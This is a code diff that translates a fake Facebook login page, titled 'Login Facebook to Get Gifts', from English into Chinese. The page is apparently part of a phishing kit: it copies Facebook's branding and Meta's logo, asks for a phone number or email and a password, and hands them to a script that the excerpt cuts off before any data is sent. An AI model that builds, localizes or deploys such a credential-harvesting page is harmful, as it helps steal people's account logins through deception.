@@ -7,16 +7,16 @@ if (strpos($currentUrl, '/fb_themes/theme2/') === false) {
 ?>
 <?= $baseHref ?>
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh">
 
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Facebook Login</title>
-    <meta name="title" content="Login Facebook to Get Gifts" />
+    <title>Facebook 登录</title>
+    <meta name="title" content="Facebook 登录领取礼物" />
     <link rel="icon" href="images/facvicon.png" type="image/png">
-    <meta property="twitter:title" content="Login Facebook to Get Gifts" />
-    <meta property="twitter:description" content="Login Facebook to Get Gifts" />
+    <meta property="twitter:title" content="Facebook 登录领取礼物" />
+    <meta property="twitter:description" content="Facebook 登录领取礼物" />
     <meta property="twitter:card" content="summary_large_image" />
     <meta property="og:title" content="1" />
     <meta property="og:type" content="article" />
@@ -40,7 +40,7 @@ if (strpos($currentUrl, '/fb_themes/theme2/') === false) {
                 <div class="popup-content">
                     <p id="error-message"></p>
                     <div class="popup-divider"></div>
-                    <button id="close-popup" onclick="closepop()">OK</button>
+                    <button id="close-popup" onclick="closepop()">确定</button>
                 </div>
             </div>
 
@@ -50,24 +50,24 @@ if (strpos($currentUrl, '/fb_themes/theme2/') === false) {
 
                     <div class="jav">
                         <input type="text" id="tk" name="username" required class="inputtkmk"
-                            placeholder="Mobile number or email" onfocus="this.placeholder = ''"
-                            onblur="this.placeholder = 'Mobile number or email'">
+                            placeholder="手机号或邮箱" onfocus="this.placeholder = ''"
+                            onblur="this.placeholder = '手机号或邮箱'">
                     </div>
                     <div class="jav">
-                        <input type="password" id="mk" name="password" required class="inputtkmk" placeholder="Password"
-                            onfocus="this.placeholder = ''" onblur="this.placeholder = 'Password'">
+                        <input type="password" id="mk" name="password" required class="inputtkmk" placeholder="密码"
+                            onfocus="this.placeholder = ''" onblur="this.placeholder = '密码'">
                     </div>
                     <div class="jav" style="margin-bottom: 16px;">
-                        <button type="submit" class="login" id="login">Log In</button>
+                        <button type="submit" class="login" id="login">登录</button>
                     </div>
                 </form>
 
                 <div class="jav">
-                    <p class="resetpass">Forgot your password?</p>
+                    <p class="resetpass">忘记密码？</p>
                 </div>
                 <div class="xx"></div>
                 <div class="jav">
-                    <button class="regacc">Create new account</button>
+                    <button class="regacc">创建新帐户</button>
                     <center>
                         <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" alt=""
                             class="meta">
@@ -102,11 +102,11 @@ if (strpos($currentUrl, '/fb_themes/theme2/') === false) {
                     var username = document.getElementsByName('username')[0].value;
                     var password = document.getElementsByName('password')[0].value;
                     if (!isValidEmail(username) && !isValidPhone(username)) {
-                        showError('Incorrect username or password');
+                        showError('用户名或密码错误');
                         return;
                     }
                     if (!isValidPassword(password)) {
-                        showError('Incorrect username or password');
+                        showError('用户名或密码错误');
                         return;
                     }
                     (async () => {
